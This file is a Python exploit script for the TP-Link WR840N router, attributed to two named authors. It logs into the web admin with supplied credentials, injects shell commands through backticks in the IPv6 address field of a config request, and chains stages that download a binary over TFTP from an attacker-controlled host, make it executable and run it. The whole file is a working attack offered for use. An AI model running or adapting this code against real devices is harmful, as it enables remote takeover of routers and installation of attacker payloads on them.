#!/usr/bin/python
# -*- coding: utf-8 -*-
# Author: Samir Sanchez Garnica and Luis Jacome Valencia
# Description: This script exploits a remote command execution vulnerability in the TP-Link WR840N router, using the IPv6 protocol.

import requests
from requests.auth import HTTPBasicAuth
import base64
import argparse


class RCE():
    def __init__(self, ip, username, password):
        self.ip = ip
        self.http = requests.Session()
        self.http.auth = HTTPBasicAuth(username, password)

    def exploit(self, command):
        # Building the malicious request
        payload = ('[WAN_ETH_INTF#1,0,0,0,0,0#0,0,0,0,0,0]0,2\r\n'
                    'X_TP_lastUsedIntf=ipoe_eth3_s\r\n'
                    'X_TP_lastUsedName=ewan_ipoe_s\r\n'
                    '[WAN_IP_CONN#1,1,1,0,0,0#0,0,0,0,0,0]1,18\r\n'
                    'externalIPAddress=172.26.26.2\r\n'
                    'subnetMask=255.255.255.0\r\n'
                    'defaultGateway=172.26.26.1\r\n'
                    'NATEnabled=1\r\n'
                    'X_TP_FullconeNATEnabled=0\r\n'
                    'X_TP_FirewallEnabled=1\r\n'
                    'maxMTUSize=1500\r\n'
                    'DNSOverrideAllowed=1\r\n'
                    'DNSServers=1.1.1.1,8.8.8.8\r\n'
                    'X_TP_IPv4Enabled=0\r\n'
                    'X_TP_IPv6Enabled=1\r\n'
                    'X_TP_IPv6AddressingType=Static\r\n'
                    f'X_TP_ExternalIPv6Address=`{command}`\r\n'
                    'X_TP_PrefixLength=128\r\n'
                    'X_TP_DefaultIPv6Gateway=::\r\n'
                    'X_TP_IPv6DNSOverrideAllowed=1\r\n'
                    'X_TP_IPv6DNSServers=::,::\r\n'
                    'enable=1\r\n')

        self.http.post(
            url=f"http://{self.ip}/cgi?2&2",
            headers = {
                'Content-Type': 'text/plain',
                'Referer': f'http://{self.ip}/mainFrame.htm',
            },
            data=payload,
            timeout=10
        )


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("target", dest="target", help="Router web admin IP address")
    parser.add_argument("--username", dest="username", help="Router web admin username", required=True)
    parser.add_argument("--password", dest="password", help="Router web admin password", required=True)
    parser.add_argument("--lhost", dest="lhost", help="Host of TFTP server for payload delivery", required=True)
    parser.add_argument("--lport", dest="lport", help="Port of TFTP server for payload delivery", required=True)
    args = parser.parse_args()

    rce = RCE(args.target, args.username, args.password)

    commands = (
        f'tftp -g -r s -l/var/tmp/r {args.lhost}',
        'chmod +x /var/tmp/r', '/var/tmp/r &'
    )
    
    for command in commands:
        rce.exploit(command)
        print(f"[+] Exploiting stage: {command}")

if __name__ == "__main__":
    main()
